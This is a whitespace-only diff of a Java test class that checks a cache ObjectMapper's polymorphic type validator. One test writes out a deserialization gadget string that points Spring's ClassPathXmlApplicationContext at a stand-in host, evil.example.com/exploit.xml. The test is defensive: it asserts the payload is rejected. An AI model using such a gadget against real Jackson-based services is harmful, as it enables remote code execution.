@@ -39,9 +39,9 @@ class CacheConfigObjectMapperTest {
     private ObjectMapper createCacheObjectMapper() {
         ObjectMapper mapper = new ObjectMapperConfig().objectMapper();
         mapper.activateDefaultTyping(
-                CachePolymorphicTypeValidatorFactory.createDefault(),
-                ObjectMapper.DefaultTyping.NON_FINAL,
-                JsonTypeInfo.As.PROPERTY
+            CachePolymorphicTypeValidatorFactory.createDefault(),
+            ObjectMapper.DefaultTyping.NON_FINAL,
+            JsonTypeInfo.As.PROPERTY
         );
         mapper.setVisibility(PropertyAccessor.GETTER, JsonAutoDetect.Visibility.NONE);
         mapper.setVisibility(PropertyAccessor.IS_GETTER, JsonAutoDetect.Visibility.NONE);
@@ -56,20 +56,20 @@ class CacheConfigObjectMapperTest {
 
     private GetAligoTemplateDetailResult.ButtonResult createTestButtonResult() {
         return new GetAligoTemplateDetailResult.ButtonResult(
-                1, "버튼1", "WL",
-                "https://m.example.com", "https://example.com",
-                "iosapp://example", "andapp://example"
+            1, "버튼1", "WL",
+            "https://m.example.com", "https://example.com",
+            "iosapp://example", "andapp://example"
         );
     }
 
     private GetAligoTemplateDetailResult createTestDetailResult(List<GetAligoTemplateDetailResult.ButtonResult> buttons) {
         return new GetAligoTemplateDetailResult(
-                1L, "senderKey-1", "TPL_001", "테스트 템플릿",
-                "템플릿 본문", "제목", "부제목", "BA",
-                "EM", false, false,
-                "https://example.com/img.jpg", "img.jpg",
-                "APR", "ACTIVE", "코멘트",
-                buttons
+            1L, "senderKey-1", "TPL_001", "테스트 템플릿",
+            "템플릿 본문", "제목", "부제목", "BA",
+            "EM", false, false,
+            "https://example.com/img.jpg", "img.jpg",
+            "APR", "ACTIVE", "코멘트",
+            buttons
         );
     }
 
@@ -101,7 +101,7 @@ class CacheConfigObjectMapperTest {
         // given
         ObjectMapper mapper = createCacheObjectMapper();
         List<GetAligoTemplateDetailResult.ButtonResult> buttons = Stream.of(createTestButtonResult())
-                .collect(Collectors.toCollection(ArrayList::new));
+            .collect(Collectors.toCollection(ArrayList::new));
         GetAligoTemplateDetailResult original = createTestDetailResult(buttons);
 
         // when
@@ -163,7 +163,7 @@ class CacheConfigObjectMapperTest {
 
         // when & then
         assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
-                .isInstanceOf(InvalidTypeIdException.class);
+            .isInstanceOf(InvalidTypeIdException.class);
     }
 
     @Test
@@ -175,7 +175,7 @@ class CacheConfigObjectMapperTest {
 
         // when & then
         assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
-                .isInstanceOf(InvalidTypeIdException.class);
+            .isInstanceOf(InvalidTypeIdException.class);
     }
 
     @Test
@@ -184,10 +184,10 @@ class CacheConfigObjectMapperTest {
         // given
         ObjectMapper mapper = createCacheObjectMapper();
         String maliciousJson =
-                "[\"org.springframework.context.support.ClassPathXmlApplicationContext\",\"http://evil.example.com/exploit.xml\"]";
+            "[\"org.springframework.context.support.ClassPathXmlApplicationContext\",\"http://evil.example.com/exploit.xml\"]";
 
         // when & then
         assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
-                .isInstanceOf(InvalidTypeIdException.class);
+            .isInstanceOf(InvalidTypeIdException.class);
     }
 }
